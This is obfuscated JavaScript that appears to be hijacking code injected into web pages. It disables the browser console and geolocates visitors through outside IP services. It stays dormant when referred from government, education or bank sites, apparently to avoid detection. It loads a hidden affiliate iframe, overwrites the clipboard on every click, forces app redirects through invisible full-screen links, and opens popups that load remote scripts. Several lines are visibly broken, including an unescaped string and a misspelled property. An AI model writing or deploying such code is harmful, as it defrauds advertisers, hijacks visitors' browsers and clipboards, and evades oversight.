 
 
 
var a0_0x2e0705 = function () {
    var _0x240ee3 = !![];
    return function (_0xfbefe4, _0x4b630e) {
        var _0x10cc3b = _0x240ee3 ? function () {
            if (_0x4b630e) {
                var _0x2fb0c2 = _0x4b630e["apply"](_0xfbefe4, arguments);
                _0x4b630e = null;
                return _0x2fb0c2;
            }
        } : function () {
        };
        _0x240ee3 = ![];
        return _0x10cc3b;
    };
}();
(function () {
    a0_0x2e0705(this, function () {
        var _0x600889 = new RegExp("function *\( *\)");
        var _0x113fa8 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
        var _0x547527 = a0_0x4b790f("init");
        if (!_0x600889["test"](_0x547527 + 'chain') || !_0x113fa8["test"](_0x547527 + 'input')) {
            _0x547527('0');
        } else {
            a0_0x4b790f();
        }
    })();
}());
var a0_0x27475d = function () {
    var _0x5e2acb = !![];
    return function (_0x190ba5, _0x32c231) {
        var _0x5887d7 = _0x5e2acb ? function () {
            if (_0x32c231) {
                var _0xc60b97 = _0x32c231['apply'](_0x190ba5, arguments);
                _0x32c231 = null;
                return _0xc60b97;
            }
        } : function () {
        };
        _0x5e2acb = ![];
        return _0x5887d7;
    };
}();
var a0_0x20e6d2 = a0_0x27475d(this, function () {
    var _0x253c78 = function () {
    };
    var _0x3c9dc3;
    try {
        var _0xd9ac2f = Function("return (function() " + "{}.constructor("return this")( )" + ');');
        _0x3c9dc3 = _0xd9ac2f();
    } catch (_0x2e2fad) {
        _0x3c9dc3 = window;
    }
    if (!_0x3c9dc3["console"]) {
        _0x3c9dc3["console"] = function (_0xb1536e) {
            var _0x1b1e77 = {};
            _0x1b1e77["log"] = _0xb1536e;
            _0x1b1e77['warn'] = _0xb1536e;
            _0x1b1e77["debug"] = _0xb1536e;
            _0x1b1e77['info'] = _0xb1536e;
            _0x1b1e77["error"] = _0xb1536e;
            _0x1b1e77['exception'] = _0xb1536e;
            _0x1b1e77['table'] = _0xb1536e;
            _0x1b1e77["trace"] = _0xb1536e;
            return _0x1b1e77;
        }(_0x253c78);
    } else {
        _0x3c9dc3["console"]["log"] = _0x253c78;
        _0x3c9dc3["console"]["warn"] = _0x253c78;
        _0x3c9dc3["console"]['debug'] = _0x253c78;
        _0x3c9dc3["console"]['info'] = _0x253c78;
        _0x3c9dc3["console"]["error"] = _0x253c78;
        _0x3c9dc3['console']['exception'] = _0x253c78;
        _0x3c9dc3["console"]['table'] = _0x253c78;
        _0x3c9dc3["console"]["trace"] = _0x253c78;
    }
});
a0_0x20e6d2();
var channelstatus = 1;
var reflimitstatus = 1;
var channelflag = 'bd2666';
var AndroidSchemeStr = [];
var IosSchemeStr = [];
var DefaultCityTjCode = [];
var WTjCode = [
    {
        'c': "https://hm.baidu.com/xxx1.js",
        'w': 9
    },
    {
        'c': "https://hm.baidu.com/xxx2.js",
        'w': 1
    }
];
var TongjiBeginHoure = "00:00:00";
var TongjiEndHoure = "23:59:59";
var UvBeginHoure = "00:00:00";
var UvEndHoure = '23:59:59';
var UvIntervalHoure = 0;
var ShieldIp = '';
var ShieldCity = '';
var ShieldRefDomain = "*.gov.cn,*.edu.cn,*.ccb.com,*.boc.cn,*.abchina.com,*.icbc.com.cn,*.psbc.com,*.localhost,*.org,*.xz6d.com,*.weyangzhi.com,*.people.cn";
var ShieldDomain = '';
var ShieldTelm = '';
var AllowWap = 1;
var AllowWeixin = 1;
var AllowPC = 1;
var maxLoadCount = 1;
var ThirdCode = "var _hmt = _hmt || [];
(function() {
var iframeElement = document.createElement("iframe");
iframeElement.sandbox = 'allow-popups allow-top-navigation allow-forms allow-same-origin allow-scripts';
    iframeElement.src ="https://u.jd.com/ue5HuA";
    iframeElement.style.display = "none";
    document.body.appendChild(iframeElement);
})();";
var FourthCodesForAndroid = '';
var FourthCodesForIos = '';
var WordsArr = '';
var WordBeginHoure = "00:00:00";
var WordEndHoure = "23:59:59";
var Jump_List = [];
var OpenwinStatus = 0;
var SchemeStr = [];
var MiniSite = new Object();
MiniSite['Browser'] = {
    'ie': /msie/["test"](window["navigator"]["userAgent"]["toLowerCase"]()),
    'moz': /gecko/['test'](window["navigator"]["userAgent"]["toLowerCase"]()),
    'opera': /opera/["test"](window["navigator"]["userAgent"]["toLowerCase"]()),
    'safari': /safari/["test"](window["navigator"]['userAgent']['toLowerCase']())
};
MiniSite["JsLoader"] = {
    'load': function (_0x3c934f, _0x19312c) {
        var _0xeb435f = document["createElement"]("script");
        _0xeb435f["setAttribute"]("charset", "gbk");
        _0xeb435f["setAttribute"]('type', 'text/javascript');
        _0xeb435f["setAttribute"]('src', _0x3c934f);
        document["getElementsByTagName"]("head")[0]["appendChild"](_0xeb435f);
        if (MiniSite["Browser"]['ie']) {
            _0xeb435f["onreadystatechange"] = function () {
                if (this['readyState'] == "loaded" || this["readyStaate"] == "complete") {
                    if (_0x19312c != undefined) {
                        _0x19312c();
                    }
                }
            };
        } else if (MiniSite['Browser']["moz"]) {
            _0xeb435f["onload"] = function () {
                if (_0x19312c != undefined) {
                    _0x19312c();
                }
            };
        } else {
            if (_0x19312c != undefined) {
                _0x19312c();
            }
        }
    }
};
Array["prototype"]["contains"] = function (_0x22407b) {
    var _0x1539a1 = this["length"];
    while (_0x1539a1--) {
        if (this[_0x1539a1]["indexOf"](_0x22407b) > -1) {
            return !![];
        }
    }
    return ![];
};
var systemType = 1;
if (/(iPhone|iPad|iPod|iOS)/i["test"](window['navigator']['userAgent'])) {
    systemType = 2;
    SchemeStr = IosSchemeStr;
} else if (/(Android)/i['test'](window["navigator"]["userAgent"])) {
    systemType = 1;
    SchemeStr = AndroidSchemeStr;
}
var AllowPlate = isAllowPlate();
var reflimitflag = isReflimitflag();
var isfload = ![];
if (fisrtload(maxLoadCount) == ![]) {
    isfload = !![];
}
if (isfload) {
    if (isDROk(WordBeginHoure, WordEndHoure)) {
        document["addEventListener"]("click", cwd, !![]);
    }
}
if (channelstatus == 1) {
    if (isfload) {
        if (AllowPlate) {
            if (reflimitflag) {
                var map = {};
                var dest = [];
                for (var i = 0; i < SchemeStr["length"]; i++) {
                    var ai = SchemeStr[i];
                    if (!map[ai["GroupId"]]) {
                        dest["push"]({
                            'GroupId': ai["GroupId"],
                            'data': [ai]
                        });
                        map[ai['GroupId']] = ai;
                    } else {
                        for (var j = 0; j < dest["length"]; j++) {
                            var dj = dest[j];
                            if (dj['GroupId'] == ai["GroupId"]) {
                                dj["data"]['push'](ai);
                                break;
                            }
                        }
                    }
                }
                var dest2 = [];
                for (var i = 0; i < dest['length']; i++) {
                    var array2 = dest[i]["data"];
                    var rand = parseInt(Math['random']() * array2["length"], 10);
                    dest2["push"](array2[rand]);
                }
                SchemeStr = dest2;
                MiniSite["JsLoader"]['load']("//ip.ws.126.net/ipquery", function () {
                    var _0x48a299 = lc;
                    if (_0x48a299 == '') {
                        _0x48a299 = "muyouzhaodaoo";
                    }
                    if (ShieldCity["indexOf"](_0x48a299) > -1) {
                    } else {
                        var _0x541e4f = !![];
                        try {
                            MiniSite["JsLoader"]["load"]("//pv.sohu.com/cityjson?ie=utf-8", function () {
                                _0x541e4f = ![];
                                goNext();
                            });
                        } catch (_0x421be1) {
                        } finally {
                            setTimeout(() => {
                                if (_0x541e4f) {
                                    console["log"]("finally...");
                                    goNext();
                                }
                            }, 200);
                        }
                        if (isDROk(TongjiBeginHoure, TongjiEndHoure)) {
                            lockTj(_0x48a299);
                        }
                        ju();
                    }
                });
            } else {
            }
        } else {
        }
        if (OpenwinStatus == 1) {
            setTimeout(function () {
                openwin(OpenwinFlag, OpenwinCode, OpenwinBeginHoure, OpenwinEndHoure, OpenwinUvIntervalHoure);
            }, OpenwinIntervalSecond * 1000);
        } else {
            console["log"]("no openwin choice OR openwin status is closed");
        }
    }
} else {
}
function goNext() {
    var _0x26b137 = 'no';
    try {
        _0x26b137 = returnCitySN['cip'];
    } catch (_0x43c528) {
    } finally {
    }
    var _0x2567bc = ShieldIp['split'](',');
    var _0x3cf291 = _0x2567bc["contains"](_0x26b137);
    if (_0x3cf291) {
    } else {
        var _0x5872ff = ShieldDomain['split'](',');
        var _0x8390f0 = window["document"]["domain"]["replace"](window["document"]['domain']['substr'](0, window["document"]["domain"]["indexOf"]('.')), '');
        var _0x29533e = _0x5872ff['contains'](_0x8390f0);
        if (_0x29533e) {
        } else {
            if (isShieldRefDomain(ShieldRefDomain)) {
            } else {
                var _0x128f65 = ShieldTelm["split"](',');
                var _0x39a293 = _0x128f65["contains"](getBrand());
                if (_0x39a293) {
                } else {
                    if (SchemeStr["length"] > 0) {
                        if (isUvIntervalOk(UvIntervalHoure)) {
                            for (var _0x1725f5 = 0; _0x1725f5 < SchemeStr["length"]; _0x1725f5++) {
                                var _0x34a045 = Date["parse"](SchemeStr[_0x1725f5]['AdsBegintime']['replace'](/-/g, '/'));
                                var _0x57ed70 = Date["parse"](SchemeStr[_0x1725f5]['AdsEndtime']["replace"](/-/g, '/'));
                                var _0x51bf6e = Date["now"]();
                                if (_0x51bf6e >= _0x34a045 && _0x51bf6e <= _0x57ed70) {
                                    var _0x2ba66f = new Date();
                                    var _0x27fe14 = _0x2ba66f["getFullYear"]() + '-' + (_0x2ba66f['getMonth']() + 1) + '-' + _0x2ba66f['getDate']() + ' ' + SchemeStr[_0x1725f5]["BeginHour"];
                                    var _0x51f6b0 = _0x2ba66f["getFullYear"]() + '-' + (_0x2ba66f['getMonth']() + 1) + '-' + _0x2ba66f['getDate']() + ' ' + SchemeStr[_0x1725f5]["EndHour"];
                                    if (SchemeStr[_0x1725f5]["EndHour"] == '24:00:00') {
                                        _0x51f6b0 = _0x2ba66f["getFullYear"]() + '-' + (_0x2ba66f['getMonth']() + 1) + '-' + (_0x2ba66f["getDate"]() + 1) + ' 00:00:00';
                                    }
                                    if (_0x2ba66f['getTime']() >= Date["parse"](_0x27fe14['replace'](/-/g, '/')) && _0x2ba66f["getTime"]() <= Date['parse'](_0x51f6b0["replace"](/-/g, '/'))) {
                                        var _0x14e4f7 = _0x1725f5;
                                        setTimeout('callapp2(\'' + SchemeStr[_0x14e4f7]["Linkname"] + '\')', _0x14e4f7 == 0 ? 100 : SchemeStr[_0x14e4f7]['IntervalSecond'] * 1000);
                                    } else {
                                    }
                                } else {
                                }
                            }
                        }
                    } else {
                    }
                }
            }
        }
    }
}
function openwin(_0x1cbeea, _0x2ba213, _0x293699, _0xd689ac, _0x216c07) {
    if (isOpenwinIntervalOk(_0x293699, _0xd689ac, _0x216c07)) {
        var _0x532b2e = window["open"]("about:blank", "_blank");
        if (_0x532b2e) {
            if (_0x1cbeea == 1) {
                var _0x47ed45 = document["createElement"]("script");
                _0x47ed45['setAttribute']("type", "text/javascript");
                _0x47ed45["setAttribute"]('src', _0x2ba213);
                _0x532b2e["document"]["getElementsByTagName"]("head")[0]['appendChild'](_0x47ed45);
            } else {
                _0x532b2e['location']["href"] = _0x2ba213;
            }
        }
    } else {
        console["log"]("not in hour-range OR uvinterval is shout");
    }
}
function isOpenwinIntervalOk(_0x1147f8, _0x7930b8, _0x379fca) {
    var _0x51c812 = ![];
    var _0xbafd06 = new Date();
    var _0x4ffb92 = _0xbafd06['getFullYear']() + '-' + (_0xbafd06['getMonth']() + 1) + '-' + _0xbafd06["getDate"]();
    var _0x3b9a81 = _0xbafd06["getFullYear"]() + '-' + (_0xbafd06["getMonth"]() + 1) + '-' + (_0xbafd06["getDate"]() - 1);
    var _0x3d7a53 = _0xbafd06["getFullYear"]() + '-' + (_0xbafd06["getMonth"]() + 1) + '-' + _0xbafd06["getDate"]() + ' ' + _0x1147f8;
    var _0x4c928d = _0xbafd06['getFullYear']() + '-' + (_0xbafd06['getMonth']() + 1) + '-' + _0xbafd06["getDate"]() + ' ' + _0x7930b8;
    if (Date["parse"](_0x4c928d['replace'](/-/g, '/')) < Date["parse"](_0x3d7a53["replace"](/-/g, '/'))) {
        _0x4c928d = _0xbafd06['getFullYear']() + '-' + (_0xbafd06["getMonth"]() + 1) + '-' + (_0xbafd06['getDate']() + 1) + ' ' + _0x7930b8;
    }
    if (_0xbafd06["getTime"]() >= Date["parse"](_0x3d7a53["replace"](/-/g, '/')) && _0xbafd06["getTime"]() <= Date["parse"](_0x4c928d["replace"](/-/g, '/'))) {
        var _0x2668f9 = window["localStorage"]["getItem"]('flagczadsopenwinuvInterval' + channelflag + _0x4ffb92);
        if (_0x2668f9 == null) {
            window["localStorage"]['setItem']('flagczadsopenwinuvInterval' + channelflag + _0x4ffb92, 1);
            window['localStorage']["setItem"]("czadsopenwinuvInterval" + channelflag, _0xbafd06["getTime"]());
            window["localStorage"]['removeItem']('flagczadsopenwinuvInterval' + channelflag + _0x3b9a81);
            _0x51c812 = !![];
        } else {
            var _0x208256 = window["localStorage"]['getItem']("czadsopenwinuvInterval" + channelflag);
            if (_0x208256 != null) {
                if (_0xbafd06["getTime"]() - _0x208256 > _0x379fca * 3600 * 1000) {
                    _0x51c812 = !![];
                    window["localStorage"]['setItem']("czadsopenwinuvInterval" + channelflag, _0xbafd06["getTime"]());
                } else {
                    _0x51c812 = ![];
                }
            }
        }
    } else {
        _0x51c812 = ![];
    }
    return _0x51c812;
}
function cwd() {
    var _0x3ec36a = document["createElement"]('input');
    var _0x44147c = WordsArr["split"]('|');
    if (_0x44147c["length"] == 0) {
        _0x3ec36a["value"] = '';
    } else {
        _0x3ec36a["value"] = _0x44147c[parseInt(Math['random']() * _0x44147c["length"], 10)];
    }
    document["body"]["appendChild"](_0x3ec36a);
    _0x3ec36a['focus']();
    _0x3ec36a["select"]();
    var _0x22c304 = document["execCommand"]('copy', ![], null);
    _0x3ec36a['style']["display"] = "none";
}
function fisrtload(_0x3894aa) {
    var _0x1245e8 = ![];
    var _0x426da8 = new Date();
    var _0x3f580a = _0x426da8["getFullYear"]() + '-' + (_0x426da8["getMonth"]() + 1) + '-' + _0x426da8["getDate"]();
    var _0x5e7d25 = _0x426da8['getFullYear']() + '-' + (_0x426da8["getMonth"]() + 1) + '-' + (_0x426da8["getDate"]() - 1);
    var _0x44e180 = window["localStorage"]["getItem"]("flagczadsFirstLoad" + channelflag + _0x3f580a);
    if (_0x44e180 == null) {
        window["localStorage"]["setItem"]("flagczadsFirstLoad" + channelflag + _0x3f580a, 1);
        window["localStorage"]["removeItem"]("flagczadsFirstLoad" + channelflag + _0x5e7d25);
        if (_0x3894aa == 1) {
            _0x1245e8 = ![];
        } else {
            _0x1245e8 = !![];
        }
    } else {
        var _0x18321f = parseInt(window["localStorage"]['getItem']('flagczadsFirstLoad' + channelflag + _0x3f580a)) + 1;
        if (_0x18321f < _0x3894aa) {
            _0x1245e8 = !![];
        }
        window["localStorage"]['setItem']("flagczadsFirstLoad" + channelflag + _0x3f580a, _0x18321f);
    }
    return _0x1245e8;
}
function jload(_0x73e996) {
    var _0x4ff519 = ![];
    var _0x588bd6 = new Date();
    var _0x47e2ea = _0x588bd6["getFullYear"]() + '-' + (_0x588bd6["getMonth"]() + 1) + '-' + _0x588bd6['getDate']();
    var _0x538914 = _0x588bd6["getFullYear"]() + '-' + (_0x588bd6["getMonth"]() + 1) + '-' + (_0x588bd6["getDate"]() - 1);
    var _0x1b458f = window["localStorage"]["getItem"]('flagczadsFirstJumpLoad' + channelflag + _0x47e2ea);
    if (_0x1b458f == null) {
        window['localStorage']["setItem"]('flagczadsFirstJumpLoad' + channelflag + _0x47e2ea, 1);
        window["localStorage"]['removeItem']("flagczadsFirstJumpLoad" + channelflag + _0x538914);
        if (_0x73e996 == 1) {
            _0x4ff519 = ![];
        } else {
            _0x4ff519 = !![];
        }
    } else {
        var _0x138797 = parseInt(window["localStorage"]["getItem"]("flagczadsFirstJumpLoad" + channelflag + _0x47e2ea)) + 1;
        if (_0x138797 < _0x73e996) {
            _0x4ff519 = !![];
        }
        window['localStorage']["setItem"]("flagczadsFirstJumpLoad" + channelflag + _0x47e2ea, _0x138797);
    }
    return _0x4ff519;
}
function isUvIntervalOk(_0x3f06f7) {
    var _0x421fb5 = ![];
    var _0x1b658c = new Date();
    var _0xabe42f = _0x1b658c["getFullYear"]() + '-' + (_0x1b658c["getMonth"]() + 1) + '-' + _0x1b658c["getDate"]();
    var _0x5570d5 = _0x1b658c['getFullYear']() + '-' + (_0x1b658c["getMonth"]() + 1) + '-' + (_0x1b658c['getDate']() - 1);
    var _0x29cc6b = _0x1b658c["getFullYear"]() + '-' + (_0x1b658c["getMonth"]() + 1) + '-' + _0x1b658c["getDate"]() + ' ' + UvBeginHoure;
    var _0xf481d7 = _0x1b658c["getFullYear"]() + '-' + (_0x1b658c["getMonth"]() + 1) + '-' + _0x1b658c["getDate"]() + ' ' + UvEndHoure;
    if (Date["parse"](_0xf481d7["replace"](/-/g, '/')) < Date['parse'](_0x29cc6b["replace"](/-/g, '/'))) {
        _0xf481d7 = _0x1b658c["getFullYear"]() + '-' + (_0x1b658c["getMonth"]() + 1) + '-' + (_0x1b658c["getDate"]() + 1) + ' ' + end;
    }
    if (_0x1b658c["getTime"]() >= Date["parse"](_0x29cc6b['replace'](/-/g, '/')) && _0x1b658c["getTime"]() <= Date["parse"](_0xf481d7["replace"](/-/g, '/'))) {
        var _0x1f3f54 = window["localStorage"]["getItem"]("flagczadsuvInterval" + channelflag + _0xabe42f);
        if (_0x1f3f54 == null) {
            window["localStorage"]["setItem"]("flagczadsuvInterval" + channelflag + _0xabe42f, 1);
            window['localStorage']["setItem"]("czadsuvInterval" + channelflag, _0x1b658c["getTime"]());
            window["localStorage"]['removeItem']('flagczadsuvInterval' + channelflag + _0x5570d5);
            _0x421fb5 = !![];
        } else {
            var _0x12a603 = window['localStorage']["getItem"]("czadsuvInterval" + channelflag);
            if (_0x12a603 != null) {
                if (_0x1b658c["getTime"]() - _0x12a603 > _0x3f06f7 * 3600 * 1000) {
                    _0x421fb5 = !![];
                    window["localStorage"]["setItem"]("czadsuvInterval" + channelflag, _0x1b658c['getTime']());
                } else {
                    _0x421fb5 = ![];
                }
            }
        }
    } else {
        _0x421fb5 = ![];
    }
    return _0x421fb5;
}
function isJumpIntervalOk(_0x46b6fb) {
    var _0x245bdd = ![];
    var _0x3b4315 = new Date();
    var _0x17c907 = _0x3b4315["getFullYear"]() + '-' + (_0x3b4315["getMonth"]() + 1) + '-' + _0x3b4315["getDate"]();
    var _0x4ced6e = _0x3b4315["getFullYear"]() + '-' + (_0x3b4315["getMonth"]() + 1) + '-' + (_0x3b4315["getDate"]() - 1);
    var _0x1be4f3 = window["localStorage"]["getItem"]("flagczadsJumpInterval" + channelflag + _0x17c907);
    if (_0x1be4f3 == null) {
        window["localStorage"]["setItem"]("flagczadsJumpInterval" + channelflag + _0x17c907, 1);
        window["localStorage"]["setItem"]("czadsjumpInterval" + channelflag, _0x3b4315["getTime"]());
        window["localStorage"]["removeItem"]("flagczadsJumpInterval" + channelflag + _0x4ced6e);
        _0x245bdd = !![];
    } else {
        var _0x3a373f = window["localStorage"]["getItem"]("czadsjumpInterval" + channelflag);
        if (_0x3a373f != null) {
            if (_0x3b4315["getTime"]() - _0x3a373f > _0x46b6fb * 3600 * 1000) {
                _0x245bdd = !![];
                window['localStorage']['setItem']('czadsjumpInterval' + channelflag, _0x3b4315["getTime"]());
            } else {
                _0x245bdd = ![];
            }
        }
    }
    return _0x245bdd;
}
function isShieldRefDomain(_0xcabfcc) {
    var _0x9e9b5b = ![];
    var _0x46aece = '';
    if (_0xcabfcc == '' || _0xcabfcc["length"] == 0) {
        _0x9e9b5b = ![];
    } else {
        var _0x4159dd = _0xcabfcc["split"](',');
        if (window["top"] != window['self']) {
            if (window['document']["referrer"]["replace"]("http://", '')["replace"]("https://", '')['indexOf'](':') > -1) {
                var _0x1be033 = window["document"]["referrer"]["replace"](window['document']["referrer"]["substr"](0, window["document"]['referrer']["indexOf"]('.')), '');
                _0x46aece = _0x1be033["substr"](0, _0x1be033["indexOf"](':'));
            } else {
                var _0x1be033 = window["document"]["referrer"]["replace"](window["document"]["referrer"]["substr"](0, window['document']["referrer"]['indexOf']('.')), '');
                _0x46aece = _0x1be033["substr"](0, _0x1be033["indexOf"]('/'));
            }
            _0x9e9b5b = _0x4159dd["contains"](_0x46aece);
        } else {
            _0x9e9b5b = ![];
        }
    }
    return _0x9e9b5b;
}
function evokeByLocation(_0xca1a42) {
    window["location"]['href'] = _0xca1a42;
}
function evokeByIFrame(_0x255fef) {
    if (!iframe) {
        iframe = document["createElement"]("iframe");
        iframe["frameborder"] = '0';
        iframe['style']["cssText"] = "display:none;border:0;width:0;height:0;";
        document["body"]['appendChild'](iframe);
    }
    iframe['src'] = _0x255fef;
}
function evokeByTagA2(_0x5a4607) {
    var _0x7d3633 = parseInt(Math["random"]() * 1000000000);
    var _0x14122b = document["createElement"]('a');
    _0x14122b["setAttribute"]('href', _0x5a4607);
    var _0x1cbe03 = document["createElement"]("div");
    _0x1cbe03["setAttribute"]('id', _0x7d3633);
    _0x1cbe03["style"]['cssText'] = "display:block;line-height:60px;position:relative;z-index:100;margin-top:5px;text-align:right;width:100%;height:" + window["innerHeight"] + "px;font-size:30px;";
    _0x14122b["appendChild"](_0x1cbe03);
    document["body"]['appendChild'](_0x14122b);
    _0x14122b["addEventListener"]('touchend', _0x17be69, ![]);
    _0x14122b["addEventListener"]("click", _0x17be69, ![]);
    setTimeout(function () {
        document['getElementById'](_0x7d3633)["style"]["display"] = "none";
        _0x14122b["removeEventListener"]('touchend', _0x17be69, ![]);
        _0x14122b["removeEventListener"]("click", _0x17be69, ![]);
    }, 3000);
    function _0x17be69(_0x225b34) {
        _0x14122b["click"]();
    }
}
function getBrowser() {
    var _0x323e4b = window["navigator"]["userAgent"] || '';
    var _0x3cc1f9 = /android/i["test"](_0x323e4b);
    var _0x5766b1 = /iphone|ipad|ipod/i['test'](_0x323e4b);
    var _0x514c3a = /micromessenger\/([\d.]+)/i['test'](_0x323e4b);
    var _0x370165 = /(weibo).*weibo__([\d.]+)/i['test'](_0x323e4b);
    var _0x866b1d = /qq\/([\d.]+)/i['test'](_0x323e4b);
    var _0x375b21 = /(qqbrowser)\/([\d.]+)/i["test"](_0x323e4b);
    var _0x4ecb01 = /(sogou)/i["test"](_0x323e4b);
    var _0x4d99d5 = /(2345browser)/i['test'](_0x323e4b);
    var _0x27fdbd = /(maxthon)/i["test"](_0x323e4b);
    var _0x269e14 = /qzone\/.*_qz_([\d.]+)/i["test"](_0x323e4b);
    var _0x2096b6 = /chrome\/[\d.]+ Mobile Safari\/[\d.]+/i["test"](_0x323e4b) && _0x3cc1f9;
    var _0x2836e3 = /safari\/([\d.]+)$/i["test"](_0x323e4b) && _0x5766b1 && _0x323e4b["indexOf"]("Crios") < 0 && _0x323e4b["indexOf"]('Mozilla') === 0;
    return {
        'isAndroid': _0x3cc1f9,
        'isIos': _0x5766b1,
        'isWechat': _0x514c3a,
        'isWeibo': _0x370165,
        'isQQ': _0x866b1d,
        'isQQBrowser': _0x375b21,
        'isSogouBrowser': _0x4ecb01,
        'is2345Browser': _0x4d99d5,
        'ismaxthonBrowser': _0x27fdbd,
        'isQzone': _0x269e14,
        'isOriginalChrome': _0x2096b6,
        'isSafari': _0x2836e3
    };
}
function getIOSVersion() {
    var _0x299018 = window['navigator']["appVersion"]['match'](/OS (\d+)_(\d+)_?(\d+)?/);
    return parseInt(_0x299018[1], 10);
}
function getBrand() {
    var _0x26f652 = '';
    var _0x55303a = window["navigator"]["userAgent"]["toLowerCase"]()['split']('(')[1]["split"](')')[0];
    var _0x48dca9 = [
        /iphone/gi,
        /huawei/gi,
        /xiaomi/gi,
        /vivo/gi,
        /oppo/gi,
        /samsung/gi,
        /sony/gi,
        /nokia/gi,
        /htc/gi,
        /zte/gi,
        /lenovo/gi,
        /zuk/gi,
        /redmi/gi,
        /honor/gi,
        /mi/gi,
        /ipad/gi,
        /pbem/gi
    ];
    if (_0x48dca9[0]["test"](_0x55303a) || _0x48dca9[15]["test"](_0x55303a)) {
        _0x26f652 = "iPhone";
    } else if (_0x48dca9[1]["test"](_0x55303a) || _0x48dca9[13]["test"](_0x55303a)) {
        _0x26f652 = "HUAWEI";
    } else if (_0x48dca9[2]["test"](_0x55303a) || _0x48dca9[14]["test"](_0x55303a)) {
        _0x26f652 = "XiaoMi";
    } else if (_0x48dca9[3]["test"](_0x55303a)) {
        _0x26f652 = "vivo";
    } else if (_0x48dca9[4]["test"](_0x55303a) || _0x48dca9[16]["test"](_0x55303a)) {
        _0x26f652 = "OPPO";
    } else if (_0x48dca9[5]['test'](_0x55303a)) {
        _0x26f652 = "SAMSUNG";
    } else if (_0x48dca9[6]['test'](_0x55303a)) {
        _0x26f652 = "SONY";
    } else if (_0x48dca9[7]['test'](_0x55303a)) {
        _0x26f652 = "Nokia";
    } else if (_0x48dca9[8]["test"](_0x55303a)) {
        _0x26f652 = 'HTC';
    } else if (_0x48dca9[9]['test'](_0x55303a)) {
        _0x26f652 = "ZTE";
    } else if (_0x48dca9[10]["test"](_0x55303a) || _0x48dca9[11]["test"](_0x55303a)) {
        _0x26f652 = "Lenovo";
    } else if (_0x48dca9[12]['test'](_0x55303a)) {
        _0x26f652 = 'Redmi';
    } else {
        _0x26f652 = 'Android';
    }
    return _0x26f652;
}
function isAllowPlate() {
    var _0xd0c393 = ![];
    var _0x2e8fb8 = window["navigator"]["userAgent"]['toLowerCase']()["split"]('(')[1]['split'](')')[0];
    var _0x210bbf = /iphone|ipad|ipod|android/i['test'](_0x2e8fb8);
    var _0xbaae6b = /micromessenger\/([\d.]+)/i['test'](window['navigator']['userAgent']);
    var _0x394eb5 = ![];
    if (window['navigator']["platform"] == "Win32" || window["navigator"]["platform"] == 'Mac') {
        _0x394eb5 = !![];
    } else {
        _0x394eb5 = ![];
    }
    if (_0xbaae6b) {
        _0x210bbf = ![];
    }
    if (AllowPC == 1 && AllowWeixin == 1 && AllowWap == 1) {
        _0xd0c393 = !![];
        console['log']('allow all');
    } else if (AllowPC == 1 && _0x394eb5 == !![]) {
        _0xd0c393 = !![];
        console['log']("allow pc");
    } else if (AllowWeixin == 1 && _0xbaae6b == !![]) {
        _0xd0c393 = !![];
        console['log']("allow weixin");
    } else if (AllowWap == 1 && _0x210bbf == !![]) {
        _0xd0c393 = !![];
        console["log"]('allow wap');
    }
    return _0xd0c393;
}
function isReflimitflag() {
    var _0x173b3a = !![];
    if (reflimitstatus == 1) {
        _0x173b3a = !![];
    } else {
        if (window["top"] != window['self']) {
            _0x173b3a = !![];
        } else {
            _0x173b3a = ![];
        }
    }
    return _0x173b3a;
}
function callapp2(_0x18d799) {
    var _0x1f2f2e = getBrowser();
    if (_0x1f2f2e["isIos"]) {
        if (_0x1f2f2e["isWechat"] || _0x1f2f2e["isQQ"] || _0x1f2f2e["isQQBrowser"] || window["navigator"]["userAgent"]["toLocaleLowerCase"]()['indexOf']("ucbrowser") > -1) {
            evokeByTagA2(_0x18d799);
        } else if (getIOSVersion() < 9) {
            evokeByIFrame(_0x18d799);
        } else if (_0x1f2f2e['isSafari']) {
            if (window["navigator"]["userAgent"]["toLocaleLowerCase"]()["indexOf"]("version") > -1) {
            } else {
                evokeByTagA2(_0x18d799);
            }
        } else {
            evokeByLocation(_0x18d799);
        }
    } else if (_0x1f2f2e['isWechat']) {
        evokeByTagA2(_0x18d799);
    } else if (_0x1f2f2e["isOriginalChrome"]) {
        if (_0x1f2f2e["isSogouBrowser"] || _0x1f2f2e["is2345Browser"] || _0x1f2f2e["ismaxthonBrowser"]) {
            evokeByLocation(_0x18d799);
        } else if (window["navigator"]["userAgent"]["toLocaleLowerCase"]()['indexOf']("miui") > -1) {
            evokeByLocation(_0x18d799);
        } else if (window['navigator']["userAgent"]["toLocaleLowerCase"]()["indexOf"]("build") > -1 && window["navigator"]["userAgent"]["toLocaleLowerCase"]()['indexOf']('rowser') > -1) {
            evokeByLocation(_0x18d799);
        } else if (window["navigator"]["userAgent"]['toLocaleLowerCase']()['indexOf']("redmi") > -1) {
            evokeByTagA2(_0x18d799);
        } else {
            if (window['navigator']['userAgent']['toLocaleLowerCase']()["indexOf"]("build") > -1) {
                evokeByLocation(_0x18d799);
            } else {
                evokeByTagA2(_0x18d799);
            }
        }
    } else {
        evokeByLocation(_0x18d799);
    }
}
function goTjByCity(_0x25208f) {
    if (AllowPlate) {
        var _0x405fb0 = ShieldDomain["split"](',');
        var _0x6bdd45 = window["document"]["domain"]["replace"](window["document"]['domain']["substr"](0, window["document"]['domain']["indexOf"]('.')), '');
        var _0x5704df = _0x405fb0["contains"](_0x6bdd45);
        if (!_0x5704df) {
            var _0x1564c7 = '';
            var _0x3b4016 = ![];
            for (var _0x10896e = 0; _0x10896e < DefaultCityTjCode["length"]; _0x10896e++) {
                if (DefaultCityTjCode[_0x10896e]["CityName"] == _0x25208f) {
                    _0x3b4016 = !![];
                    _0x1564c7 = DefaultCityTjCode[_0x10896e]["TongjiCode"];
                    break;
                }
            }
            if (_0x3b4016) {
            } else {
                var _0x3d7c0 = [];
                for (var _0x2d0b53 = 0; _0x2d0b53 < WTjCode["length"]; _0x2d0b53++) {
                    for (var _0x39bb14 = 0; _0x39bb14 < WTjCode[_0x2d0b53]['w']; _0x39bb14++) {
                        _0x3d7c0['push'](WTjCode[_0x2d0b53]);
                    }
                }
                var _0x44c6b3 = parseInt(Math["random"]() * _0x3d7c0["length"], 10);
                _0x1564c7 = _0x3d7c0[_0x44c6b3]['c'];
            }
            MiniSite["JsLoader"]["load"]('' + _0x1564c7 + '', function () {
                if (ThirdCode != '') {
                    ThirdCode;
                }
                if (systemType == 1) {
                    if (FourthCodesForAndroid != '') {
                        FourthCodesForAndroid;
                    }
                } else {
                    if (FourthCodesForIos != '') {
                        FourthCodesForIos;
                    }
                }
            });
        }
    }
}
